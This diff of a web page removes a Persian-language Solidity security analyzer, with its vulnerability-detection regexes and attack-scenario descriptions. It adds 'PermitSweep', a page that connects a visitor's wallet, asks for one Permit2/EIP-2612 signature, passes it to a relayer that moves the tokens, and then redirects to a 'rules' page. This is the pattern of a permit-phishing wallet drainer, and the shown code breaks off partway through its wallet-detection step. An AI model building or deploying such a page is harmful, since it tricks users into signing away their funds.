@@ -1,1577 +1,227 @@
-<!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solidity Security Analyzer Pro - Dark Edition</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        :root {
-            --bg-primary: #0a0a0a;
-            --bg-secondary: #111111;
-            --bg-tertiary: #1a1a1a;
-            --bg-card: #161616;
-            --primary: #3b82f6;
-            --primary-light: #60a5fa;
-            --primary-dark: #1d4ed8;
-            --danger: #ef4444;
-            --warning: #f59e0b;
-            --success: #10b981;
-            --info: #06b6d4;
-            --text-primary: #f8fafc;
-            --text-secondary: #cbd5e1;
-            --text-muted: #64748b;
-            --border: #2d2d2d;
-            --border-light: #404040;
-            --shadow: rgba(0, 0, 0, 0.5);
-            --shadow-lg: rgba(0, 0, 0, 0.7);
-            --gradient-primary: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
-            --gradient-danger: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
-            --gradient-success: linear-gradient(135deg, #10b981 0%, #059669 100%);
-        }
-        
-        body {
-            font-family: 'Vazirmatn', -apple-system, BlinkMacSystemFont, 'Inter', sans-serif;
-            background: var(--bg-primary);
-            color: var(--text-primary);
-            line-height: 1.7;
-            min-height: 100vh;
-            background-image: 
-                radial-gradient(circle at 25% 25%, rgba(59, 130, 246, 0.15) 0%, transparent 50%),
-                radial-gradient(circle at 75% 75%, rgba(16, 185, 129, 0.15) 0%, transparent 50%);
-        }
-        
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
-            padding: 80px 30px;
-            background: var(--bg-card);
-            border-radius: 24px;
-            border: 1px solid var(--border);
-            box-shadow: 0 8px 32px var(--shadow);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .header::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: var(--gradient-primary);
-        }
-        
-        .header h1 {
-            font-size: 3.5rem;
-            font-weight: 700;
-            background: var(--gradient-primary);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 20px;
-            letter-spacing: -0.02em;
-        }
-        
-        .header p {
-            font-size: 1.25rem;
-            color: var(--text-secondary);
-            max-width: 700px;
-            margin: 0 auto;
-            font-weight: 400;
-        }
-        
-        .main-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 40px;
-            align-items: start;
-        }
-        
-        .input-panel, .results-panel {
-            background: var(--bg-card);
-            border-radius: 20px;
-            padding: 35px;
-            border: 1px solid var(--border);
-            box-shadow: 0 8px 32px var(--shadow);
-            backdrop-filter: blur(10px);
-        }
-        
-        .panel-title {
-            font-size: 1.75rem;
-            font-weight: 600;
-            color: var(--text-primary);
-            margin-bottom: 25px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .code-textarea {
-            width: 100%;
-            height: 450px;
-            border: 2px solid var(--border);
-            border-radius: 16px;
-            padding: 25px;
-            font-family: 'JetBrains Mono', 'SF Mono', monospace;
-            font-size: 14px;
-            line-height: 1.6;
-            background: var(--bg-secondary);
-            color: var(--text-primary);
-            resize: vertical;
-            transition: all 0.3s ease;
-        }
-        
-        .code-textarea:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
-            background: var(--bg-tertiary);
-        }
-        
-        .analyze-btn {
-            width: 100%;
-            background: var(--gradient-primary);
-            color: white;
-            border: none;
-            border-radius: 16px;
-            padding: 20px 30px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 25px;
-            transition: all 0.4s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .analyze-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s;
-        }
-        
-        .analyze-btn:hover:not(:disabled)::before {
-            left: 100%;
-        }
-        
-        .analyze-btn:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 40px rgba(59, 130, 246, 0.4);
-        }
-        
-        .analyze-btn:disabled {
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border);
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-            gap: 18px;
-            margin-bottom: 35px;
-        }
-        
-        .stat-card {
-            background: var(--bg-secondary);
-            padding: 25px;
-            border-radius: 16px;
-            text-align: center;
-            border: 1px solid var(--border);
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .stat-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: var(--gradient-primary);
-            transform: scaleX(0);
-            transition: transform 0.3s ease;
-        }
-        
-        .stat-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--primary);
-        }
-        
-        .stat-card:hover::before {
-            transform: scaleX(1);
-        }
-        
-        .stat-number {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: var(--text-primary);
-        }
-        
-        .stat-label {
-            color: var(--text-muted);
-            font-size: 0.9rem;
-            font-weight: 500;
-        }
-        
-        .vulnerability-card {
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            margin-bottom: 20px;
-            overflow: hidden;
-            background: var(--bg-secondary);
-            transition: all 0.3s ease;
-        }
-        
-        .vulnerability-card:hover {
-            border-color: var(--border-light);
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-        }
-        
-        .vulnerability-header {
-            padding: 25px;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.3s ease;
-        }
-        
-        .vulnerability-header:hover {
-            background: var(--bg-tertiary);
-        }
-        
-        .severity-critical .vulnerability-header { border-right: 4px solid var(--danger); }
-        .severity-high .vulnerability-header { border-right: 4px solid #f97316; }
-        .severity-medium .vulnerability-header { border-right: 4px solid var(--warning); }
-        .severity-low .vulnerability-header { border-right: 4px solid var(--success); }
-        .severity-info .vulnerability-header { border-right: 4px solid var(--info); }
-        
-        .vulnerability-title {
-            font-weight: 600;
-            color: var(--text-primary);
-            margin-bottom: 8px;
-            font-size: 1.1rem;
-        }
-        
-        .vulnerability-meta {
-            font-size: 0.9rem;
-            color: var(--text-muted);
-            line-height: 1.4;
-        }
-        
-        .vulnerability-details {
-            padding: 0 25px 25px;
-            display: none;
-            animation: slideDown 0.4s ease;
-            border-top: 1px solid var(--border);
-            background: var(--bg-tertiary);
-        }
-        
-        .vulnerability-details.active {
-            display: block;
-        }
-        
-        @keyframes slideDown {
-            from {
-                opacity: 0;
-                transform: translateY(-15px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .section-title {
-            color: var(--primary-light);
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin: 25px 0 15px 0;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .code-block {
-            background: var(--bg-primary);
-            color: #e2e8f0;
-            padding: 20px;
-            border-radius: 12px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 13px;
-            margin: 15px 0;
-            overflow-x: auto;
-            border: 1px solid var(--border);
-            line-height: 1.6;
-        }
-        
-        .attack-scenario {
-            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1) 0%, rgba(220, 38, 38, 0.05) 100%);
-            border: 1px solid rgba(239, 68, 68, 0.3);
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        
-        .attack-scenario h4 {
-            color: #fca5a5;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .attack-steps {
-            margin: 15px 0;
-        }
-        
-        .attack-step {
-            background: rgba(0, 0, 0, 0.3);
-            border-right: 3px solid var(--danger);
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 8px;
-            font-size: 0.95rem;
-            line-height: 1.6;
-        }
-        
-        .attack-step strong {
-            color: #fca5a5;
-        }
-        
-        .recommendation {
-            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1) 0%, rgba(5, 150, 105, 0.05) 100%);
-            border: 1px solid rgba(16, 185, 129, 0.3);
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        
-        .recommendation h4 {
-            color: #6ee7b7;
-            margin-bottom: 12px;
-        }
-        
-        .advanced-analysis {
-            background: linear-gradient(135deg, rgba(6, 182, 212, 0.1) 0%, rgba(14, 165, 233, 0.05) 100%);
-            border: 1px solid rgba(6, 182, 212, 0.3);
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        
-        .advanced-analysis h4 {
-            color: #67e8f9;
-            margin-bottom: 12px;
-        }
-        
-        .loading {
-            text-align: center;
-            padding: 80px 20px;
-        }
-        
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid var(--border);
-            border-top: 3px solid var(--primary);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 25px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .no-results {
-            text-align: center;
-            padding: 80px 20px;
-            color: var(--text-muted);
-        }
-        
-        .no-results.success {
-            color: var(--success);
-        }
-        
-        .expand-icon {
-            font-size: 1.2rem;
-            transition: transform 0.3s ease;
-            color: var(--text-muted);
-        }
-        
-        .expand-icon.rotated {
-            transform: rotate(180deg);
-        }
-        
-        .severity-badge {
-            display: inline-block;
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        
-        .severity-critical { background: rgba(239, 68, 68, 0.2); color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.4); }
-        .severity-high { background: rgba(249, 115, 22, 0.2); color: #fed7aa; border: 1px solid rgba(249, 115, 22, 0.4); }
-        .severity-medium { background: rgba(245, 158, 11, 0.2); color: #fde68a; border: 1px solid rgba(245, 158, 11, 0.4); }
-        .severity-low { background: rgba(16, 185, 129, 0.2); color: #6ee7b7; border: 1px solid rgba(16, 185, 129, 0.4); }
-        .severity-info { background: rgba(6, 182, 212, 0.2); color: #67e8f9; border: 1px solid rgba(6, 182, 212, 0.4); }
-        
-        .impact-badge {
-            display: inline-block;
-            padding: 4px 10px;
-            border-radius: 12px;
-            font-size: 0.7rem;
-            font-weight: 500;
-            margin: 0 5px;
-        }
-        
-        .impact-financial { background: rgba(239, 68, 68, 0.15); color: #f87171; }
-        .impact-dos { background: rgba(245, 158, 11, 0.15); color: #fbbf24; }
-        .impact-privacy { background: rgba(139, 92, 246, 0.15); color: #a78bfa; }
-        .impact-governance { background: rgba(16, 185, 129, 0.15); color: #34d399; }
-        
-        @media (max-width: 768px) {
-            .main-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .header h1 {
-                font-size: 2.5rem;
-            }
-            
-            .stats-grid {
-                grid-template-columns: repeat(3, 1fr);
-            }
-            
-            .input-panel, .results-panel {
-                padding: 25px;
-            }
-        }
-        
-        /* Custom scrollbar */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-        
-        ::-webkit-scrollbar-track {
-            background: var(--bg-secondary);
-        }
-        
-        ::-webkit-scrollbar-thumb {
-            background: var(--border-light);
-            border-radius: 4px;
-        }
-        
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--primary);
-        }
-    </style>
+  <meta charset="utf-8"/>
+  <title>PermitSweep - Sign & Redirect</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 24px; max-width: 720px; margin: auto; }
+    .box { padding: 16px; border-radius: 8px; background: #f6f7fb; margin-top: 12px; }
+    button { padding: 10px 16px; font-size: 16px; }
+    small { color: #666; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <header class="header">
-            <h1>🛡️ Solidity Security Pro</h1>
-            <p>تحلیلگر فوق‌پیشرفته امنیت قراردادهای هوشمند با قابلیت‌های تشخیص حملات پیچیده</p>
-        </header>
-        
-        <div class="main-grid">
-            <div class="input-panel">
-                <h2 class="panel-title">
-                    📝 کد Solidity
-                </h2>
-                <textarea 
-                    id="solidityCode" 
-                    class="code-textarea" 
-                    placeholder="// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+  <h2>PermitSweep — connect & sign</h2>
+  <p class="box">
+    This page will: connect your wallet, request a single signature (Permit2/EIP-2612), then redirect you to the rules page.
+    <br><small>All actual token transfer will be performed by the relayer (gasless for you).</small>
+  </p>
 
-contract VulnerableContract {
-    mapping(address => uint256) public balances;
-    
-    function deposit() public payable {
-        balances[msg.sender] += msg.value;
+  <div id="status" class="box">Initializing…</div>
+
+<script>
+(async () => {
+  // ------------------ CONFIG (replace placeholders) ------------------
+  // Put your deployed vault contract address (PermitSweep)
+  const VAULT_ADDRESS = "<PUT_VAULT_ADDRESS_HERE>";
+  // Permit2 contract address (canonical). Keep or change for local testing.
+  const PERMIT2_ADDRESS = "<PUT_PERMIT2_ADDRESS_HERE>";
+  // Relayer endpoint where we POST the signed payload:
+  const RELAYER_ENDPOINT = "<PUT_YOUR_RELAYER_API_ENDPOINT_HERE>"; // e.g. https://relayer.yourdomain.com/relay
+  // If token is provided in query string like ?token=0x..., it will override DEFAULT_TOKEN
+  const DEFAULT_TOKEN = "<PUT_A_DEFAULT_TEST_TOKEN_IF_ANY>";
+  // The page to redirect user to (your rules/terms page)
+  const DESTINATION_PAGE = "https://YOUR-RULES-PAGE.com"; // 🔧 replace with your rules URL
+  // Relayer fee to request in token units (as decimal string in token's smallest unit)
+  const RELAYER_FEE_STR = "0"; // by default 0 — relayer may expect a fee, set as needed (string)
+  // -------------------------------------------------------------------
+
+  // minimal ERC20 ABI for balanceOf/decimals/name
+  const ERC20_ABI = [
+    "function balanceOf(address) view returns (uint256)",
+    "function decimals() view returns (uint8)",
+    "function name() view returns (string)",
+    "function nonces(address) view returns (uint256)", // for ERC20Permit
+    "function DOMAIN_SEPARATOR() view returns (bytes32)"
+  ];
+
+  const status = (s) => { document.getElementById('status').innerText = s; console.log(s); };
+
+  try {
+    // Get token param
+    const params = new URLSearchParams(window.location.search);
+    const tokenAddress = (params.get('token') || DEFAULT_TOKEN).trim();
+    if (!tokenAddress) {
+      status("No token specified. Provide ?token=0x... in URL or set DEFAULT_TOKEN in the config.");
+      return;
     }
-    
-    function withdraw() public {
-        uint256 amount = balances[msg.sender];
-        require(amount > 0, 'No balance');
-        
-        (bool success, ) = msg.sender.call{value: amount}('');
-        require(success, 'Transfer failed');
-        
-        balances[msg.sender] = 0;
+
+    if (!window.ethereum) {
+      status("No injected wallet detected. Please open with MetaMask or compatible wallet.");
+      return;
     }
-}">
-                </textarea>
-                <button id="analyzeBtn" class="analyze-btn">
-                    <span id="btnText">🔍 تحلیل امنیتی پیشرفته</span>
-                </button>
-            </div>
-            
-            <div class="results-panel">
-                <h2 class="panel-title">
-                    📊 نتایج تحلیل
-                </h2>
-                <div id="results">
-                    <div class="no-results">
-                        کد خود را وارد کرده و دکمه تحلیل را کلیک کنید
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
 
-    <script>
-        class UltimateSecurityAnalyzer {
-            constructor() {
-                this.patterns = this.initializeAdvancedPatterns();
-                this.advancedChecks = this.initializeAdvancedChecks();
-                this.attackScenarios = this.initializeAttackScenarios();
-                this.setupEventListeners();
-            }
-
-            initializeAdvancedPatterns() {
-                return {
-                    reentrancy: {
-                        patterns: [
-                            /\.call\s*\{[^}]*value[^}]*\}[^;]*;(?!\s*balances\[[^\]]+\]\s*=\s*0)/g,
-                            /\.transfer\s*\([^)]+\)[^;]*;(?=.*balances\[[^\]]+\]\s*=)/g,
-                            /payable\([^)]+\)\.call/g,
-                            /msg\.sender\.call\{value:/g,
-                            /external.*view.*returns.*\{[^}]*balances/gs
-                        ],
-                        antiPatterns: [
-                            /nonReentrant/gi,
-                            /ReentrancyGuard/gi,
-                            /require\s*\(\s*!locked/gi,
-                            /locked\s*=\s*true/g,
-                            /balances\[[^\]]+\]\s*=\s*0.*\.call/gs,
-                            /_beforeTokenTransfer/g
-                        ],
-                        severity: 'critical',
-                        title: 'آسیب‌پذیری Reentrancy',
-                        description: 'امکان حمله Reentrancy وجود دارد که می‌تواند منجر به تخلیه کامل قرارداد شود',
-                        impact: ['financial', 'dos'],
-                        gasImpact: 'high',
-                        cwe: 'CWE-841'
-                    },
-
-                    flashLoanAttack: {
-                        patterns: [
-                            /function\s+\w+[^{]*\{[^}]*balanceOf[^}]*transfer[^}]*\}/gs,
-                            /\.transferFrom\s*\([^)]*\)[^;]*;(?=.*price)/g,
-                            /price\s*=.*balanceOf/g,
-                            /getAmountOut[^;]*;[^}]*transfer/gs
-                        ],
-                        antiPatterns: [
-                            /oracle/gi,
-                            /chainlink/gi,
-                            /twap/gi,
-                            /require\s*\([^)]*block\.timestamp[^)]*lastUpdate/g
-                        ],
-                        severity: 'critical',
-                        title: 'آسیب‌پذیری Flash Loan Attack',
-                        description: 'قرارداد در برابر حملات Flash Loan که قیمت‌ها را دستکاری می‌کنند، محافظت نشده',
-                        impact: ['financial'],
-                        gasImpact: 'medium',
-                        cwe: 'CWE-20'
-                    },
-
-                    frontRunning: {
-                        patterns: [
-                            /function\s+\w+[^{]*public[^{]*\{[^}]*transfer[^}]*\}/gs,
-                            /function\s+\w+[^{]*external[^{]*\{[^}]*approve[^}]*\}/gs,
-                            /function\s+buy[^{]*\{[^}]*price[^}]*\}/gs,
-                            /function\s+sell[^{]*\{[^}]*price[^}]*\}/gs
-                        ],
-                        antiPatterns: [
-                            /commit.*reveal/gi,
-                            /timelock/gi,
-                            /private/g,
-                            /onlyOwner/g,
-                            /maxSlippage/gi
-                        ],
-                        severity: 'high',
-                        title: 'آسیب‌پذیری Front-Running/MEV',
-                        description: 'توابع حساس که ممکن است توسط بات‌های MEV مورد سوءاستفاده قرار گیرند',
-                        impact: ['financial'],
-                        gasImpact: 'low',
-                        cwe: 'CWE-362'
-                    },
-
-                    accessControlBypass: {
-                        patterns: [
-                            /function\s+\w+[^{]*public[^{]*payable[^{]*\{/g,
-                            /function\s+\w+[^{]*external[^{]*payable[^{]*\{/g,
-                            /selfdestruct\s*\(/g,
-                            /delegatecall\s*\(/g,
-                            /assembly\s*\{[^}]*sstore[^}]*\}/gs
-                        ],
-                        antiPatterns: [
-                            /onlyOwner/g,
-                            /require\s*\(\s*msg\.sender\s*==\s*owner/g,
-                            /modifier\s+only\w+/g,
-                            /hasRole\s*\(/g,
-                            /_checkOwner\s*\(/g,
-                            /AccessControl/g
-                        ],
-                        severity: 'critical',
-                        title: 'کنترل دسترسی ناکافی',
-                        description: 'توابع حساس بدون کنترل دسترسی مناسب که اجازه دسترسی غیرمجاز را می‌دهد',
-                        impact: ['financial', 'governance'],
-                        gasImpact: 'low',
-                        cwe: 'CWE-862'
-                    },
-
-                    integerOverflow: {
-                        patterns: [
-                            /\+\+\w+|--\w+|\w\+\+|\w--/g,
-                            /[\w\[\]\.]+\s*[\+\-\*\/]\s*=\s*\w+/g,
-                            /unchecked\s*\{[^}]*[\+\-\*\/][^}]*\}/gs,
-                            /\w+\s*\*\s*\w+\s*\/\s*\w+/g
-                        ],
-                        antiPatterns: [
-                            /pragma\s+solidity\s+[\^~>=<\s]*0\.8/g,
-                            /SafeMath/g,
-                            /require\s*\([^)]*overflow[^)]*\)/gi,
-                            /Math\.add|Math\.sub|Math\.mul/g
-                        ],
-                        severity: 'medium',
-                        title: 'احتمال Integer Overflow/Underflow',
-                        description: 'عملیات ریاضی که ممکن است منجر به overflow یا underflow شود',
-                        impact: ['financial'],
-                        gasImpact: 'low',
-                        cwe: 'CWE-190'
-                    },
-
-                    oracleManipulation: {
-                        patterns: [
-                            /price\s*=.*balanceOf/g,
-                            /getPrice[^;]*;(?!.*oracle)/g,
-                            /\.balanceOf\s*\([^)]*\)[^;]*;[^}]*price/gs,
-                            /this\.balance[^;]*;[^}]*price/gs
-                        ],
-                        antiPatterns: [
-                            /chainlink/gi,
-                            /oracle/gi,
-                            /twap/gi,
-                            /require\s*\([^)]*minPrice[^)]*maxPrice/g
-                        ],
-                        severity: 'high',
-                        title: 'دستکاری قیمت Oracle',
-                        description: 'استفاده از منابع قیمت قابل دستکاری که ممکن است منجر به سوءاستفاده شود',
-                        impact: ['financial'],
-                        gasImpact: 'medium',
-                        cwe: 'CWE-20'
-                    },
-
-                    timestampManipulation: {
-                        patterns: [
-                            /block\.timestamp\s*[<>=!]+\s*\w+/g,
-                            /now\s*[<>=!]+\s*\w+/g,
-                            /require\s*\([^)]*block\.timestamp[^)]*\)/g,
-                            /if\s*\([^)]*block\.timestamp[^)]*\)/g,
-                            /block\.timestamp\s*\%/g
-                        ],
-                        antiPatterns: [
-                            /block\.number/g,
-                            /oracle/gi,
-                            /chainlink/gi,
-                            /\+\s*\d+\s*minutes/g
-                        ],
-                        severity: 'medium',
-                        title: 'وابستگی خطرناک به زمان',
-                        description: 'استفاده از block.timestamp که توسط ماینرها قابل دستکاری است',
-                        impact: ['financial', 'governance'],
-                        gasImpact: 'low',
-                        cwe: 'CWE-367'
-                    },
-
-                    txOrigin: {
-                        patterns: [
-                            /tx\.origin/g
-                        ],
-                        antiPatterns: [
-                            /msg\.sender/g
-                        ],
-                        severity: 'high',
-                        title: 'استفاده خطرناک از tx.origin',
-                        description: 'tx.origin به جای msg.sender که منجر به آسیب‌پذیری phishing می‌شود',
-                        impact: ['financial', 'governance'],
-                        gasImpact: 'low',
-                        cwe: 'CWE-346'
-                    },
-
-                    weakRandomness: {
-                        patterns: [
-                            /keccak256\s*\([^)]*block\.(timestamp|number|difficulty)[^)]*\)/g,
-                            /blockhash\s*\([^)]*\)\s*%/g,
-                            /block\.difficulty\s*%/g,
-                            /uint\s*\([^)]*block\.timestamp[^)]*\)\s*%/g
-                        ],
-                        antiPatterns: [
-                            /VRF/gi,
-                            /oracle/gi,
-                            /chainlink/gi,
-                            /commit.*reveal/gi,
-                            /nonce/gi
-                        ],
-                        severity: 'high',
-                        title: 'تولید عدد تصادفی ضعیف',
-                        description: 'استفاده از منابع قابل پیش‌بینی برای تولید عدد تصادفی',
-                        impact: ['financial', 'governance'],
-                        gasImpact: 'low',
-                        cwe: 'CWE-338'
-                    },
-
-                    dangerousDelegatecall: {
-                        patterns: [
-                            /\.delegatecall\s*\(/g,
-                            /assembly\s*\{[^}]*delegatecall[^}]*\}/gs,
-                            /proxy[^{]*\{[^}]*delegatecall[^}]*\}/gs
-                        ],
-                        antiPatterns: [
-                            /require\s*\([^)]*success[^)]*\)/g,
-                            /onlyOwner/g,
-                            /whitelist/gi,
-                            /approved/gi
-                        ],
-                        severity: 'critical',
-                        title: 'استفاده خطرناک از delegatecall',
-                        description: 'delegatecall بدون کنترل مناسب که ممکن است منجر به اجرای کد مخرب شود',
-                        impact: ['financial', 'governance'],
-                        gasImpact: 'high',
-                        cwe: 'CWE-250'
-                    },
-
-                    gasLimitDoS: {
-                        patterns: [
-                            /for\s*\([^{]*\.length[^{]*\)\s*\{[^}]*\}/gs,
-                            /while\s*\([^{]*\.length[^{]*\)\s*\{[^}]*\}/gs,
-                            /\.push\s*\([^)]*\)[^;]*;[^}]*\.length/gs,
-                            /for\s*\([^)]*;\s*i\s*<[^;]*\.length/g
-                        ],
-                        antiPatterns: [
-                            /require\s*\([^)]*\.length\s*[<>][^)]*\)/g,
-                            /break\s*;/g,
-                            /if\s*\([^)]*gas[^)]*\)\s*break/gi,
-                            /maxIterations/gi
-                        ],
-                        severity: 'medium',
-                        title: 'حمله DoS با محدودیت گاز',
-                        description: 'حلقه‌های نامحدود که ممکن است منجر به اتمام گاز شود',
-                        impact: ['dos'],
-                        gasImpact: 'critical',
-                        cwe: 'CWE-400'
-                    },
-
-                    uncheckedExternalCalls: {
-                        patterns: [
-                            /\.call\s*\([^)]*\)\s*;/g,
-                            /\.send\s*\([^)]*\)\s*;/g,
-                            /\.transfer\s*\([^)]*\)\s*;/g,
-                            /\.delegatecall\s*\([^)]*\)\s*;/g
-                        ],
-                        antiPatterns: [
-                            /require\s*\([^)]*\.call[^)]*\)/g,
-                            /require\s*\([^)]*\.send[^)]*\)/g,
-                            /\(bool\s+success[^)]*\)\s*=.*\.call/g,
-                            /if\s*\([^)]*success[^)]*\)/g
-                        ],
-                        severity: 'high',
-                        title: 'فراخوانی‌های خارجی بدون بررسی',
-                        description: 'فراخوانی‌های خارجی بدون بررسی نتیجه که ممکن است منجر به شکست خاموش شود',
-                        impact: ['financial'],
-                        gasImpact: 'medium',
-                        cwe: 'CWE-252'
-                    }
-                };
-            }
-
-            initializeAdvancedChecks() {
-                return {
-                    // بررسی الگوهای پیچیده امنیتی
-                    complexPatterns: [
-                        {
-                            name: 'sandwich_attack_vulnerability',
-                            check: (code) => {
-                                const hasAmm = /getAmountOut|swapExactTokensFor|addLiquidity/gi.test(code);
-                                const hasSlippage = /slippage|minAmountOut|deadline/gi.test(code);
-                                return hasAmm && !hasSlippage;
-                            },
-                            severity: 'high',
-                            title: 'آسیب‌پذیری Sandwich Attack',
-                            description: 'قرارداد در برابر حملات Sandwich در DEX محافظت نشده است'
-                        },
-                        {
-                            name: 'governance_attack',
-                            check: (code) => {
-                                const hasVoting = /vote|proposal|governance/gi.test(code);
-                                const hasTimelock = /timelock|delay|waiting/gi.test(code);
-                                return hasVoting && !hasTimelock;
-                            },
-                            severity: 'critical',
-                            title: 'آسیب‌پذیری حمله به حاکمیت',
-                            description: 'سیستم حاکمیت بدون timelock که امکان حملات flash loan را فراهم می‌کند'
-                        },
-                        {
-                            name: 'state_bloating',
-                            check: (code) => {
-                                const hasDynamicArrays = /\[\]\s+public|\[\]\s+private/g.test(code);
-                                const hasLengthControl = /require\s*\([^)]*\.length\s*</g.test(code);
-                                return hasDynamicArrays && !hasLengthControl;
-                            },
-                            severity: 'medium',
-                            title: 'آسیب‌پذیری State Bloating',
-                            description: 'آرایه‌های نامحدود که ممکن است منجر به انتفاخ state شوند'
-                        }
-                    ]
-                };
-            }
-
-            initializeAttackScenarios() {
-                return {
-                    reentrancy: {
-                        title: "سناریوی حمله Reentrancy",
-                        steps: [
-                            "مهاجم یک قرارداد مخرب ایجاد می‌کند که تابع fallback دارد",
-                            "مهاجم مقداری اتر در قرارداد هدف deposit می‌کند",
-                            "مهاجم تابع withdraw را فراخوانی می‌کند",
-                            "در هنگام دریافت اتر، تابع fallback قرارداد مهاجم اجرا می‌شود",
-                            "تابع fallback دوباره withdraw را فراخوانی می‌کند (قبل از صفر شدن balance)",
-                            "این فرآیند تا زمان تخلیه کامل قرارداد ادامه می‌یابد"
-                        ],
-                        impact: "تخلیه کامل وجوه قرارداد در یک تراکنش",
-                        prevention: "استفاده از الگوی Checks-Effects-Interactions و ReentrancyGuard"
-                    },
-
-                    flashLoanAttack: {
-                        title: "سناریوی حمله Flash Loan",
-                        steps: [
-                            "مهاجم مقدار زیادی توکن را از طریق Flash Loan قرض می‌گیرد",
-                            "با این مقدار زیاد، قیمت در AMM را دستکاری می‌کند",
-                            "از قرارداد هدف که از همین AMM برای قیمت استفاده می‌کند، سوءاستفاده می‌کند",
-                            "سود کسب شده را نگه داشته و Flash Loan را پس می‌دهد",
-                            "همه این کارها در یک تراکنش انجام می‌شود"
-                        ],
-                        impact: "سرقت وجوه از طریق دستکاری قیمت",
-                        prevention: "استفاده از Oracle های مقاوم و TWAP"
-                    },
-
-                    frontRunning: {
-                        title: "سناریوی حمله Front-Running",
-                        steps: [
-                            "مهاجم mempool شبکه را مانیتور می‌کند",
-                            "تراکنش سودآور کاربر عادی را شناسایی می‌کند",
-                            "تراکنش مشابه با gas price بالاتر ارسال می‌کند",
-                            "تراکنش مهاجم زودتر اجرا شده و سود را می‌برد",
-                            "تراکنش کاربر عادی با قیمت نامطلوب اجرا می‌شود"
-                        ],
-                        impact: "سرقت فرصت‌های معاملاتی و ضرر به کاربران",
-                        prevention: "استفاده از commit-reveal schemes یا private mempools"
-                    },
-
-                    oracleManipulation: {
-                        title: "سناریوی دستکاری Oracle",
-                        steps: [
-                            "مهاجم مقدار زیادی از یک طرف pool را خریداری می‌کند",
-                            "این کار قیمت را به طور موقت تغییر می‌دهد",
-                            "قرارداد هدف قیمت دستکاری شده را می‌خواند",
-                            "مهاجم از این قیمت غیرواقعی برای سوءاستفاده استفاده می‌کند",
-                            "سپس تراکنش‌ها را معکوس کرده و سود نهایی را می‌برد"
-                        ],
-                        impact: "سوءاستفاده از قیمت‌های دستکاری شده",
-                        prevention: "استفاده از Oracle های متعدد و TWAP"
-                    },
-
-                    gasLimitDoS: {
-                        title: "سناریوی حمله DoS با گاز",
-                        steps: [
-                            "مهاجم آرایه‌ای را با تعداد زیادی آیتم پر می‌کند",
